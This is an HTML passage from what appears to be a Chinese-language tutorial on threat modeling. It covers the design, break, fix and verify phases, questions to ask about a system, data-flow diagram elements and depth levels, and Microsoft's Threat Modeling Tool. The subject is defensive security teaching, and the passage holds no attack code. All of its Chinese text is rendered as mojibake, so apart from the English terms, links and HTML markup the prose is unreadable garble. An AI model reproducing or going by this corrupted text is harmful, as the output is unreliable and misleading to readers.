title="è°å¯ä»¥è¿›è¡Œå¨èƒå»ºæ¨¡"></a>è°å¯ä»¥è¿›è¡Œå¨èƒå»ºæ¨¡</h3><p>åªè¦äº†è§£ç³»ç»Ÿå¦‚ä½•å·¥ä½œï¼Œå¹¶ä¸”å¯¹å®‰å…¨æ€§æœ‰åŸºæœ¬çš„ç†è§£ï¼Œä»»ä½•äººéƒ½å¯ä»¥è¿›è¡Œå¨èƒå»ºæ¨¡ã€‚ æ­¤æŠ€æœ¯å¯åº”ç”¨äºä»»ä½•ï¼š</p><ul><li>è½¯ä»¶äº¤ä»˜æ–¹å¼ï¼ˆ å¦‚ <a href="http://www.ruanyifeng.com/blog/2019/03/agile-development.html">æ•æ·å‹</a> æˆ– <a href="https://zhuanlan.zhihu.com/p/29783716">ç€‘å¸ƒå‹</a> ï¼Œå¥½å¤šç€‘å¸ƒå‹ä»‹ç»å¾ˆç¹çï¼Œç›´æ¥æ‰¾äº†ä¸ªå¯¹æ¯”çš„ï¼‰</li><li>éƒ¨ç½²èŠ‚å¥ï¼ˆæ¯å°æ—¶ã€æ¯æœˆæˆ–æ¯å¹´ï¼‰</li></ul><h3 id="å­¦ä¹ ç›®æ ‡"><a href="#å­¦ä¹ ç›®æ ‡" class="headerlink" title="å­¦ä¹ ç›®æ ‡"></a>å­¦ä¹ ç›®æ ‡</h3><p>åœ¨æœ¬æ¨¡å—ï¼Œä½ å°†äº†è§£å¨èƒå»ºæ¨¡çš„å››ä¸ªæ¦‚æ‹¬æ€§æ­¥éª¤ï¼Œå¹¶èƒ½å¤Ÿå­¦å¾—ä»¥ä¸‹å†…å®¹ï¼š</p><ul><li>äº†è§£æ˜ç¡®è¦æ±‚å’Œå‡è®¾ä»¥å¸®åŠ©åˆ›å»ºæ•°æ®æµå…³ç³»å›¾çš„é‡è¦æ€§</li><li>äº†è§£å¯å¸®åŠ©ä½ æŸ¥æ‰¾ç³»ç»Ÿä¸­å®‰å…¨é—®é¢˜çš„æ¡†æ¶</li><li>äº†è§£æœ‰åŠ©äºå‡è½»æˆ–æ¶ˆé™¤æ½œåœ¨å¨èƒçš„å®‰å…¨æ§åˆ¶ç±»åˆ«</li><li>é‡ç‚¹ä»‹ç»åœ¨éƒ¨ç½²ä¹‹å‰éªŒè¯å‡è®¾ã€è¦æ±‚å’Œä¿®å¤çš„é‡è¦æ€§</li></ul><div class="note success"><p>æ— å¿…å¤‡çŸ¥è¯†å³å¯å­¦ä¹  ï¼ˆ</p></div><h2 id="æ¨¡å—1-å¨èƒå»ºæ¨¡é˜¶æ®µ"><a href="#æ¨¡å—1-å¨èƒå»ºæ¨¡é˜¶æ®µ" class="headerlink" title="æ¨¡å—1 | å¨èƒå»ºæ¨¡é˜¶æ®µ"></a>æ¨¡å—1 | å¨èƒå»ºæ¨¡é˜¶æ®µ</h2><p>åªè¦äº†è§£ç³»ç»Ÿå·¥ä½œåŸç†ï¼Œå¹¶å…·æœ‰ä¿¡æ¯å®‰å…¨çŸ¥è¯†ï¼Œä»»ä½•äººéƒ½å¯ä»¥ä½¿ç”¨å¨èƒå»ºæ¨¡æŠ€æœ¯ã€‚</p><p>æ­¤æ–¹æ³•åˆ†ä¸ºå››ä¸ªä¸åŒçš„é˜¶æ®µï¼Œæ¯ä¸ªé˜¶æ®µéƒ½åŒ…å«é‡è¦æ­¥éª¤ï¼Œå¯å¸®åŠ©ä½ åˆ›å»ºæ•°æ®æµå…³ç³»å›¾å¹¶å¯¹å…¶è¿›è¡Œåˆ†æï¼Œä»¥å‘ç°æ½œåœ¨çš„å¨èƒã€‚</p><p><img src="/img/thread-modeling/threat-modeling-steps.png" class="lazyload" data-srcset="/img/thread-modeling/threat-modeling-steps.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="threat-modeling-steps"></p><table><thead><tr><th>é˜¶æ®µ</th><th>æ ‡é¢˜</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>1</td><td>è®¾è®¡</td><td>æ˜ç¡®ç³»ç»Ÿçš„æ‰€æœ‰è¦æ±‚ï¼Œå¹¶åˆ›å»ºæ•°æ®æµå…³ç³»å›¾</td></tr><tr><td>2</td><td>ä¸­æ–­</td><td>å°†å¨èƒå»ºæ¨¡æ¡†æ¶åº”ç”¨åˆ°æ•°æ®æµå…³ç³»å›¾</td></tr><tr><td>3</td><td>ä¿®å¤</td><td>ç¡®å®šå¦‚ä½•æ­£ç¡®ç»„åˆå®‰å…¨æ§åˆ¶æ¥è§£å†³æ¯ä¸ªé—®é¢˜</td></tr><tr><td>4</td><td>éªŒè¯</td><td>éªŒè¯æ˜¯å¦æ»¡è¶³äº†è¦æ±‚</td></tr></tbody></table><div class="note warning"><p>æœ¬æ¨¡å—(1) ä¸­çš„å•å…ƒå°†è¾ƒä¸ºæ¦‚æ‹¬åœ°ä»‹ç»é‡è¦çš„å¨èƒå»ºæ¨¡æ¦‚å¿µï¼Œæœ¬æ–‡ <a href="#%E6%A8%A1%E5%9D%972-%E4%BD%BF%E7%94%A8%E6%95%B0%E6%8D%AE%E6%B5%81%E5%85%B3%E7%B3%BB%E5%9B%BE%E5%85%83%E7%B4%A0%E5%88%9B%E5%BB%BA%E5%A8%81%E8%83%81%E6%A8%A1%E5%9E%8B">æ¨¡å—2</a> å¼€å§‹å°†è¯¦ç»†è®¨è®ºè¿™äº›æ¦‚å¿µã€‚</p></div><h3 id="æ­¥éª¤1-è®¾è®¡"><a href="#æ­¥éª¤1-è®¾è®¡" class="headerlink" title="æ­¥éª¤1 - è®¾è®¡"></a>æ­¥éª¤1 - è®¾è®¡</h3><p>è®¾è®¡é˜¶æ®µæ˜¯è¿›è¡Œå¨èƒå»ºæ¨¡æ´»åŠ¨çš„åŸºç¡€ã€‚ ä½ éœ€è¦å°½å¯èƒ½å¤šåœ°æ”¶é›†å…³äºä½ æ‰€æ„å»ºçš„å†…å®¹åŠæ‰€ç”¨èµ„æºçš„æ•°æ®ã€‚</p><h4 id="ç›®æ ‡"><a href="#ç›®æ ‡" class="headerlink" title="ç›®æ ‡"></a>ç›®æ ‡</h4><ul><li>æ¸…æ¥šåœ°äº†è§£ç³»ç»Ÿçš„å·¥ä½œåŸç†</li><li>åˆ—å‡ºç³»ç»Ÿä½¿ç”¨çš„æ¯ä¸ªæœåŠ¡</li><li>æšä¸¾æœ‰å…³ç¯å¢ƒå’Œé»˜è®¤å®‰å…¨é…ç½®çš„æ‰€æœ‰å‡è®¾</li><li>ä½¿ç”¨æ­£ç¡®çš„ä¸Šä¸‹æ–‡æ·±åº¦çº§åˆ«åˆ›å»ºæ•°æ®æµå…³ç³»å›¾</li></ul><div class="note warning"><p>å¦‚æœä¸å®Œæˆæ­¤é˜¶æ®µï¼Œä½ å¯èƒ½ä¼šå¿½ç•¥ç³»ç»Ÿçš„é‡è¦å®‰å…¨è®¾è®¡æ³¨æ„äº‹é¡¹ï¼Œè¿™å¯èƒ½ä¼šä½¿ä½ çš„å®¢æˆ·é¢ä¸´é£é™©ã€‚</p></div><h4 id="æå‡ºæœ‰å…³ç³»ç»Ÿçš„é—®é¢˜"><a href="#æå‡ºæœ‰å…³ç³»ç»Ÿçš„é—®é¢˜" class="headerlink" title="æå‡ºæœ‰å…³ç³»ç»Ÿçš„é—®é¢˜"></a>æå‡ºæœ‰å…³ç³»ç»Ÿçš„é—®é¢˜</h4><p>å°½å¯èƒ½å¤šåœ°æå‡ºæœ‰å…³ç³»ç»Ÿçš„é—®é¢˜ã€‚ å¯ä»¥è€ƒè™‘ä»¥ä¸‹é—®é¢˜ï¼š</p><table><thead><tr><th>åŒºåŸŸ</th><th>é—®é¢˜</th></tr></thead><tbody><tr><td><strong>ç³»ç»Ÿè¯´æ˜</strong></td><td>ç³»ç»Ÿçš„åŠŸèƒ½æ˜¯ä»€ä¹ˆï¼Ÿ æœåŠ¡å¤„ç†çš„ä¸šåŠ¡æµç¨‹æ˜¯ä»€ä¹ˆï¼Ÿ æ˜¯å¦æ˜ç¡®å®šä¹‰äº†è¿™äº›æµç¨‹ï¼Ÿ</td></tr><tr><td><strong>ç³»ç»Ÿç¯å¢ƒ</strong></td><td>ç³»ç»Ÿæ˜¯åœ¨äº‘ä¸­è¿˜æ˜¯åœ¨æœ¬åœ°æ„å»ºçš„ï¼Ÿ å®ƒå°†åœ¨å“ªä¸ª OS ä¸Šæ„å»ºï¼Ÿ æ˜¯å¦å°†ä½¿ç”¨å®¹å™¨ï¼Ÿ ç³»ç»Ÿæ˜¯åº”ç”¨ç¨‹åºã€æœåŠ¡è¿˜æ˜¯å…¶ä»–å®Œå…¨ä¸åŒçš„ä¸œè¥¿ï¼Ÿ</td></tr><tr><td><strong>æ–¹æ¡ˆ</strong></td><td>ç”¨æˆ·å°†å¦‚ä½•ä½¿ç”¨ç³»ç»Ÿï¼Ÿ å¦‚ä½•ä¸ä½¿ç”¨ç³»ç»Ÿï¼Ÿ</td></tr><tr><td><strong>æƒé™</strong></td><td>ç³»ç»Ÿæ˜¯å¦æœ‰è„šæœ¬æ‰§è¡Œã€æ•°æ®æˆ–ç¡¬ä»¶è®¿é—®è¦æ±‚ï¼Ÿ å¦‚æœæœ‰ï¼Œæ˜¯å“ªäº›è¦æ±‚ï¼Ÿ</td></tr><tr><td><strong>äº‘æä¾›å•†</strong></td><td>ç³»ç»Ÿå°†ä½¿ç”¨å“ªä¸ªäº‘æä¾›å•†ï¼Ÿ å®ƒæä¾›å“ªäº›é»˜è®¤å®‰å…¨é…ç½®é€‰é¡¹ï¼Ÿ è¿™äº›é€‰é¡¹å¦‚ä½•å½±å“ç³»ç»Ÿå®‰å…¨è¦æ±‚ï¼Ÿ</td></tr><tr><td><strong>æ“ä½œç³»ç»Ÿ</strong></td><td>ç³»ç»Ÿå°†ä½¿ç”¨å“ªç§æ“ä½œç³»ç»Ÿï¼Ÿ å®ƒæä¾›å“ªäº›é»˜è®¤å®‰å…¨é…ç½®é€‰é¡¹ï¼Ÿ è¿™äº›é€‰é¡¹å¦‚ä½•å½±å“ç³»ç»Ÿå®‰å…¨è¦æ±‚ï¼Ÿ</td></tr><tr><td><strong>ç¬¬ä¸€æ–¹å’Œç¬¬ä¸‰æ–¹</strong></td><td>ç³»ç»Ÿå°†ä½¿ç”¨å“ªäº›ç¬¬ä¸€æ–¹å’Œç¬¬ä¸‰æ–¹æœåŠ¡ï¼Ÿ å®ƒä»¬æä¾›å“ªäº›é»˜è®¤å®‰å…¨é…ç½®é€‰é¡¹ï¼Ÿ è¿™äº›é€‰é¡¹å¦‚ä½•å½±å“ç³»ç»Ÿå®‰å…¨è¦æ±‚ï¼Ÿ</td></tr><tr><td><strong>å¸æˆ·</strong></td><td>ç³»ç»Ÿä¸­å°†ä½¿ç”¨å“ªäº›å¸æˆ·ç±»å‹ï¼Œä¾‹å¦‚ç”¨æˆ·å’Œç®¡ç†å‘˜ï¼Ÿ è¿™äº›å¸æˆ·æ˜¯æœ¬åœ°å¸æˆ·è¿˜æ˜¯äº‘å¸æˆ·ï¼Ÿ å®ƒä»¬éœ€è¦å“ªäº›è®¿é—®æƒé™ï¼Ÿä¸ºä»€ä¹ˆï¼Ÿ</td></tr><tr><td><strong>æ ‡è¯†å’Œè®¿é—®æ§åˆ¶</strong></td><td>ç³»ç»Ÿå°†å¦‚ä½•å¸®åŠ©ä¿æŠ¤è¿™äº›å¸æˆ·ï¼Ÿ å®ƒä¼šä¾èµ– Azure Active Directory (Azure AD) å—ï¼Ÿ å®ƒä¼šä½¿ç”¨è®¿é—®æ§åˆ¶åˆ—è¡¨ (ACL)ã€å¤šé‡èº«ä»½éªŒè¯ (MFA) å’Œä¼šè¯æ§åˆ¶ç­‰åŠŸèƒ½å—ï¼Ÿ</td></tr><tr><td><strong>ä»¤ç‰Œå’Œä¼šè¯</strong></td><td>ç³»ç»Ÿä¼šå¤„ç† SOAP API æˆ– REST API ä¹‹ç±»çš„è¯·æ±‚å—ï¼Ÿ å®ƒå°†å¦‚ä½•å¤„ç†ä¸åŒçš„ä¼šè¯ï¼Ÿ</td></tr><tr><td><strong>æ—è·¯</strong></td><td>ç³»ç»Ÿæ˜¯å¦ä½¿ç”¨æˆ–éœ€è¦åé—¨ï¼Ÿ å¦‚æœéœ€è¦ï¼Œå®ƒå°†å¦‚ä½•å·¥ä½œï¼Ÿ</td></tr><tr><td><strong>è®°å½•ã€ç›‘è§†å’Œå¤‡ä»½</strong></td><td>ç³»ç»Ÿä½¿ç”¨ä»€ä¹ˆæœºåˆ¶æ¥è®°å½•å®‰å…¨äº‹ä»¶ã€ç›‘è§†å¼‚å¸¸å’Œå¤‡ä»½ç³»ç»Ÿæ•°æ®ï¼Ÿ å®ƒä¼šæ•è·å“ªäº›äº‹ä»¶ç±»å‹ï¼Ÿ</td></tr><tr><td><strong>ç½‘ç»œ</strong></td><td>å°†ä½¿ç”¨å“ªäº›å…¥ä¾µæ£€æµ‹å’Œä¿æŠ¤ç³»ç»Ÿï¼Ÿ å¦‚ä½•å¯¹é€šä¿¡è¿›è¡ŒåŠ å¯†ï¼Ÿ</td></tr><tr><td><strong>æ•°æ®</strong></td><td>ç³»ç»Ÿå°†åˆ›å»ºæˆ–å¤„ç†å“ªç§ç±»å‹çš„æ•°æ®ï¼Ÿ æ•°æ®åˆ†ç±»ç±»å‹æ˜¯ä»€ä¹ˆï¼Ÿ ç³»ç»Ÿå¦‚ä½•ä¿¡ä»»æ•°æ®æºï¼Ÿ å®ƒå°†å¦‚ä½•åˆ†ææ•°æ®ï¼Ÿ é¢„æœŸçš„è¾“å…¥å’Œè¾“å‡ºè¡Œä¸ºæ˜¯ä»€ä¹ˆï¼Ÿ å¦‚ä½•å¤„ç†éªŒè¯ï¼Ÿ å¦‚ä½•åœ¨æ‰€æœ‰çŠ¶æ€ä¸‹å¯¹æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Ÿ</td></tr><tr><td><strong>æœºå¯†ç®¡ç†</strong></td><td>ç³»ç»Ÿå¦‚ä½•å¤„ç†å¯†é’¥ã€è¯ä¹¦å’Œå‡­æ®ï¼Ÿ</td></tr></tbody></table><div class="note warning"><p>ä¸Šé¢åˆ—å‡ºçš„å†…å®¹å¾ˆå¹¿æ³›ï¼Œä½†å¹¶ä¸è¯¦å°½ã€‚ ä¸ä½ çš„åŒäº‹å’Œå®‰å…¨å›¢é˜Ÿè”ç³»ï¼Œä»¥æ˜ç¡®ç³»ç»Ÿçš„æ‰€æœ‰ç›¸å…³ä¸Šä¸‹æ–‡ã€‚</p></div><div class="note info"><p>å¦‚æœä½ æœ‰ä¸“é—¨çš„å®‰å…¨å›¢é˜Ÿï¼Œè¯·ä¸ä»–ä»¬å®‰æ’ç™½æ¿ä¼šè®®ä»¥è¿›è¡Œåˆå§‹è®¾è®¡ã€‚ å®ƒå°†èŠ‚çœç›¸å½“é•¿çš„æ—¶é—´ã€‚</p></div><h4 id="åˆ›å»ºæ•°æ®æµå…³ç³»å›¾"><a href="#åˆ›å»ºæ•°æ®æµå…³ç³»å›¾" class="headerlink" title="åˆ›å»ºæ•°æ®æµå…³ç³»å›¾"></a>åˆ›å»ºæ•°æ®æµå…³ç³»å›¾</h4><p>ä½¿ç”¨ç­”æ¡ˆåˆ›å»ºæ•°æ®æµå…³ç³»å›¾ã€‚ å®ƒæ˜¾ç¤ºäº†æ•°æ®ç”Ÿå‘½å‘¨æœŸä¸­æ¯ä¸ªé˜¶æ®µçš„æ•°æ®ï¼ŒåŒ…æ‹¬ä¿¡ä»»åŒºä¸­çš„æ›´æ”¹ã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š</p><ul><li>ç”¨æˆ·ç™»å½•åˆ° Azure ä¸­æ‰˜ç®¡çš„ Web åº”ç”¨ç¨‹åºä»¥è®¿é—®æ•°æ®</li><li>ç®¡ç†å‘˜æ›´æ”¹ Web åº”ç”¨ç¨‹åºä½¿ç”¨çš„å¼¹æ€§èµ„æºçš„é»˜è®¤å®‰å…¨é…ç½®</li><li>è‡ªåŠ¨åŒ–çš„æ¯æ—¥è„šæœ¬ï¼Œç”¨äºç›‘è§† Web åº”ç”¨ç¨‹åºçš„æ´»åŠ¨æ—¥å¿—å¹¶é€šçŸ¥ç®¡ç†å‘˜ä»»ä½•å¼‚å¸¸æƒ…å†µ</li></ul><p>Microsoft å·¥ç¨‹å›¢é˜Ÿéœ€è¦æäº¤æ•°æ®æµå…³ç³»å›¾ï¼Œè¿™æ˜¯å…¶å®‰å…¨åˆè§„æ€§è¦æ±‚ã€‚ è¿™äº›å…³ç³»å›¾æœ‰åŠ©äºè¿›è¡Œä¸å®‰å…¨æ€§ç›¸å…³çš„æ¢è®¨ã€‚</p><h4 id="å›¾è§£å·¥å…·"><a href="#å›¾è§£å·¥å…·" class="headerlink" title="å›¾è§£å·¥å…·"></a>å›¾è§£å·¥å…·</h4><p>Microsoft å·¥ç¨‹å¸ˆå»ºè®®ä½¿ç”¨ç°åœ¨æä¾›çš„ä¸¤ç§å·¥å…·ä¹‹ä¸€ï¼š</p><ul><li>Threat Modeling Tool<ul><li>åœ¨çº¿å®‰è£…ç‰ˆï¼Œ<a href="https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling">https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling</a></li><li>ç¦»çº¿å®‰è£…ç‰ˆï¼Œ<a href="https://www.microsoft.com/en-us/download/details.aspx?id=49168">https://www.microsoft.com/en-us/download/details.aspx?id=49168</a> ï¼ˆ2016ï¼‰</li><li>æƒ³è£…å…¶ä»–ç¦»çº¿ç‰ˆæœ¬çš„ï¼ŒGuguru ä¸€ä¸‹ <u>microsoft threat modeling tool offline installer</u> å°±å¥½äº†</li></ul></li><li>Visioï¼Œï¼ˆè¦é’±çš„ æ‰“æ‰°äº†</li></ul><h4 id="å…³ç³»å›¾å…ƒç´ "><a href="#å…³ç³»å›¾å…ƒç´ " class="headerlink" title="å…³ç³»å›¾å…ƒç´ "></a>å…³ç³»å›¾å…ƒç´ </h4><p>æ•°æ®æµå…³ç³»å›¾æ˜¾ç¤ºäº†ç»™å®šç³»ç»Ÿä¸­çš„æ•°æ®æµã€‚ <strong>å®ƒé€šå¸¸ä»¥ç”¨æˆ·æˆ–æ•°æ®å­˜å‚¨çš„è¯·æ±‚å¼€å§‹ï¼Œä»¥æ•°æ®å­˜å‚¨æˆ– <a href="https://www.elsevier.com/solutions/analytical-services">Analytics Services</a> ç»“æŸ</strong>ã€‚ æ•°æ®æµå…³ç³»å›¾ä½¿ç”¨ä¸åŒçš„å½¢çŠ¶æ¥æŒ‡ç¤ºå®ƒä»¬æ‰€è¡¨ç¤ºçš„å…ƒç´ ã€‚</p><table><thead><tr><th align="left">å…ƒç´ </th><th align="left">å½¢çŠ¶</th><th align="left">å®šä¹‰</th></tr></thead><tbody><tr><td align="left">è¿‡ç¨‹</td><td align="left"><img src="/img/thread-modeling/process50.png" class="lazyload" data-srcset="/img/thread-modeling/process50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process50"></td><td align="left">æ¥æ”¶ã€ä¿®æ”¹è¾“å…¥æˆ–å°†è¾“å…¥é‡å®šå‘åˆ°è¾“å‡ºçš„ä»»åŠ¡ï¼Œå¦‚ Web æœåŠ¡ã€‚</td></tr><tr><td align="left">æ•°æ®å­˜å‚¨</td><td align="left"><img src="/img/thread-modeling/data-store50.png" class="lazyload" data-srcset="/img/thread-modeling/data-store50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-store50"></td><td align="left">æ°¸ä¹…å’Œä¸´æ—¶æ•°æ®å­˜å‚¨ï¼Œå¦‚ Web ç¼“å­˜å’Œ Azure æ‰˜ç®¡æ•°æ®åº“ã€‚</td></tr><tr><td align="left">å¤–éƒ¨å®ä½“</td><td align="left"><img src="/img/thread-modeling/external-entity50.png" class="lazyload" data-srcset="/img/thread-modeling/external-entity50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="external-entity50"></td><td align="left">ç›´æ¥æ§åˆ¶ä¹‹å¤–çš„ä»»åŠ¡ã€å®ä½“æˆ–æ•°æ®å­˜å‚¨ï¼Œå¦‚ç”¨æˆ·å’Œç¬¬ä¸‰æ–¹ APIã€‚</td></tr><tr><td align="left">æ•°æ®æµ</td><td align="left"><img src="/img/thread-modeling/data-flow50.png" class="lazyload" data-srcset="/img/thread-modeling/data-flow50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-flow50"></td><td align="left">è¿›ç¨‹ã€æ•°æ®å­˜å‚¨å’Œå¤–éƒ¨å®ä½“ä¹‹é—´çš„æ•°æ®ç§»åŠ¨ï¼Œå¦‚è¿æ¥å­—ç¬¦ä¸²å’Œæœ‰æ•ˆè´Ÿè½½ã€‚</td></tr><tr><td align="left">ä¿¡ä»»è¾¹ç•Œ</td><td align="left"><img src="/img/thread-modeling/trust-boundary-box50.png" class="lazyload" data-srcset="/img/thread-modeling/trust-boundary-box50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="trust-boundary-box50"><img src="/img/thread-modeling/trust-boundary-line50.png" class="lazyload" data-srcset="/img/thread-modeling/trust-boundary-line50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="trust-boundary-line50"></td><td align="left">ä¿¡ä»»åŒºåŸŸåœ¨æ•°æ®æµç»ç³»ç»Ÿæ—¶æ›´æ”¹ï¼Œå¦‚ç”¨æˆ·ä½¿ç”¨ Internet è®¿é—®å—ä¿æŠ¤çš„å…¬å¸ç½‘ç»œæ—¶ã€‚</td></tr></tbody></table><p>æ•°æ®æµå…³ç³»å›¾å…ƒç´ è¿˜éœ€è¦ä¸Šä¸‹æ–‡ï¼Œä»¥å¸®åŠ©äººä»¬äº†è§£å¦‚ä½•åœ¨ç³»ç»Ÿä¸­çš„ä½¿ç”¨å’Œä¿æŠ¤å®ƒä»¬ã€‚</p><h4 id="æ•°æ®æµå›¾æ ‡ä¸­åº”åŒ…å«çš„ä¿¡æ¯é‡"><a href="#æ•°æ®æµå›¾æ ‡ä¸­åº”åŒ…å«çš„ä¿¡æ¯é‡" class="headerlink" title="æ•°æ®æµå›¾æ ‡ä¸­åº”åŒ…å«çš„ä¿¡æ¯é‡"></a>æ•°æ®æµå›¾æ ‡ä¸­åº”åŒ…å«çš„ä¿¡æ¯é‡</h4><p>æ•°æ®æµå…³ç³»å›¾ä¸­åŒ…å«çš„ä¿¡æ¯é‡å–å†³äºå‡ ä¸ªå…³é”®å› ç´ ï¼š</p><table><thead><tr><th align="left">å› ç´ </th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">æ­£åœ¨æ„å»ºçš„ç³»ç»Ÿç±»å‹</td><td align="left">å¦‚æœç³»ç»Ÿä¸å¤„ç†æ•æ„Ÿæ•°æ®æˆ–ä»…åœ¨å†…éƒ¨ä½¿ç”¨ï¼Œåˆ™å®ƒå¯èƒ½æ¯”é¢å‘å¤–éƒ¨çš„ç³»ç»Ÿéœ€è¦æ›´å°‘çš„ä¸Šä¸‹æ–‡</td></tr><tr><td align="left">å®‰å…¨å›¢é˜Ÿæ‰€éœ€çš„ä¸Šä¸‹æ–‡</td><td align="left">å®‰å…¨å›¢é˜Ÿåœ¨å¨èƒæ¨¡å‹ä¸­çš„ç›®æ ‡éå¸¸ç²¾ç¡®ã€‚ ä¸å®‰å…¨å›¢é˜Ÿäº¤æµï¼Œç¡®è®¤æ‰€éœ€çš„å±‚æ¬¡</td></tr></tbody></table><p>å¦‚æœæœªèƒ½åŒ…å«æ­£ç¡®çš„ä¸Šä¸‹æ–‡ï¼Œå°†å¯¼è‡´å®‰å…¨æ£€æŸ¥ä¸å®Œæ•´ã€ç³»ç»Ÿå­˜åœ¨æ½œåœ¨çš„é£é™©ã€‚</p><h4 id="å…³ç³»å›¾å±‚æ¬¡"><a href="#å…³ç³»å›¾å±‚æ¬¡" class="headerlink" title="å…³ç³»å›¾å±‚æ¬¡"></a>å…³ç³»å›¾å±‚æ¬¡</h4><p>ä¸ºäº†å¸®åŠ©ä½ äº†è§£è¦åŒ…å«çš„ä¿¡æ¯é‡ï¼Œè¯·åœ¨ä»¥ä¸‹å››ä¸ªä¸Šä¸‹æ–‡å±‚æ¬¡ä¹‹é—´è¿›è¡Œé€‰æ‹©ï¼š</p><table><thead><tr><th align="left">å±‚æ¬¡</th><th align="left">æ ‡é¢˜</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">ç³»ç»Ÿ</td><td align="left">ä»»ä½•ç³»ç»Ÿçš„åŸºç¡€ã€‚ æ•°æ®æµå…³ç³»å›¾åŒ…å«ç³»ç»Ÿçš„ä¸»è¦éƒ¨åˆ†ï¼Œå¹¶æä¾›è¶³å¤Ÿçš„ä¸Šä¸‹æ–‡ï¼Œå¯å¸®åŠ©ä½ äº†è§£å…¶å·¥ä½œåŸç†åŠå½¼æ­¤äº¤äº’æ–¹å¼ã€‚</td></tr><tr><td align="left">1</td><td align="left">æµç¨‹</td><td align="left">ä½¿ç”¨é¢å¤–çš„æ•°æ®æµå…³ç³»å›¾ï¼Œå…³æ³¨ç³»ç»Ÿæ¯ä¸ªéƒ¨åˆ†çš„æ•°æ®æµå…³ç³»å›¾ã€‚ ç”¨äºæ¯ä¸ªç³»ç»Ÿï¼Œå°¤å…¶æ˜¯å¤„ç†æ•æ„Ÿæ•°æ®çš„ç³»ç»Ÿã€‚ æ­¤å±‚çš„ä¸Šä¸‹æ–‡åº”æœ‰åŠ©äºç¡®å®šå¨èƒä»¥åŠæ›´æœ‰æ•ˆåœ°é™ä½æˆ–æ¶ˆé™¤é£é™©çš„æ–¹æ³•ã€‚</td></tr><tr><td align="left">2</td><td align="left">å­è¿‡ç¨‹</td><td align="left">å…³æ³¨ç³»ç»Ÿä¸­æŸä¸€éƒ¨åˆ†çš„æ¯ä¸ªæ¬¡çº§éƒ¨åˆ†çš„æ•°æ®æµå…³ç³»å›¾ã€‚ ç”¨äºå…³é”®çš„ç³»ç»Ÿã€‚ ç¤ºä¾‹åŒ…æ‹¬é€‚ç”¨äºå®‰å…¨ç¯å¢ƒçš„ç³»ç»Ÿã€å¤„ç†é«˜åº¦æ•æ„Ÿæ•°æ®çš„ç³»ç»Ÿæˆ–åŒ…å«é«˜é£é™©è¯„çº§çš„ç³»ç»Ÿã€‚</td></tr><tr><td align="left">3</td><td align="left">æ›´è¯¦ç»†</td><td align="left">å…³æ³¨é«˜åº¦å…³é”®çš„å†…æ ¸çº§ç³»ç»Ÿã€‚ æ•°æ®æµå…³ç³»å›¾è¯¦ç»†æè¿°æ¯ä¸ªå­è¿‡ç¨‹ã€‚</td></tr></tbody></table><div class="note info"><p>å¤§å¤šæ•°æ•°æ®æµå…³ç³»å›¾åº”åŒæ—¶åŒ…å«ç¬¬ 0 å±‚å’Œç¬¬ 1 å±‚ã€‚ ä¸å®‰å…¨å›¢é˜Ÿäº¤æµï¼Œç¡®è®¤æ‰€éœ€çš„å±‚æ¬¡æ·±åº¦ã€‚</p></div><h4 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h4><ul><li>Threat Modeling Tool<ul><li>åœ¨çº¿å®‰è£…ç‰ˆï¼Œ<a 